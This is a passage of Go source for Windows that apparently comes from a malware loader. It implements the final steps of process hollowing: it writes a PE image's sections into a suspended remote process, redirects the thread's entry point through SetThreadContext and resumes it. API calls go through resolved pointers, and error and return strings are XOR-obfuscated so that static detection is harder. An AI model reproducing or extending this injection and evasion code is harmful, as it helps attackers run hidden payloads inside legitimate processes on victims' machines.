	secSize := unsafe.Sizeof(IMAGE_SECTION_HEADER{})
	for i := uint16(0); i < ntHdrs.FileHeader.NumberOfSections; i++ {
		s := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(secBase + uintptr(i)*secSize))
		if s.SizeOfRawData > 0 {
			r1, _, _ = syscall.SyscallN(pWriteProcessMemory, pi.Process, remoteBase+uintptr(s.VirtualAddress), pb+uintptr(s.PointerToRawData), uintptr(s.SizeOfRawData), uintptr(unsafe.Pointer(&written)))
			if r1 == 0 {
				return "", fmt.Errorf(xorDecrypt(encPhWS))
			}
		}
	}

	ctx.Rcx = uint64(remoteBase) + uint64(ntHdrs.OptionalHeader.AddressOfEntryPoint)
	r1, _, _ = syscall.SyscallN(pSetThreadContext, pi.Thread, uintptr(unsafe.Pointer(&ctx)))
	if r1 == 0 {
		return "", fmt.Errorf(xorDecrypt(encPhSC))
	}

	r1, _, _ = syscall.SyscallN(pResumeThread, pi.Thread)
	if r1 == 0xFFFFFFFF {
		return "", fmt.Errorf(xorDecrypt(encPhRes))
	}

	return xorDecrypt([]byte{0xd9, 0xc3, 0xcd, 0xc5, 0xc2, 0xcc, 0xc3, 0xc9, 0xc7, 0x83, 0xc9, 0xcf, 0xcc, 0xc2, 0xc7, 0xd1, 0xdf, 0xdf, 0x98, 0xcf, 0xd7, 0xde, 0x9c, 0xdc, 0xc6, 0xcc, 0xc5, 0xd2, 0xdf, 0xd6, 0x99, 0xd7, 0xea, 0xc2, 0xcf, 0xd1, 0xdf, 0xdf}), nil
}
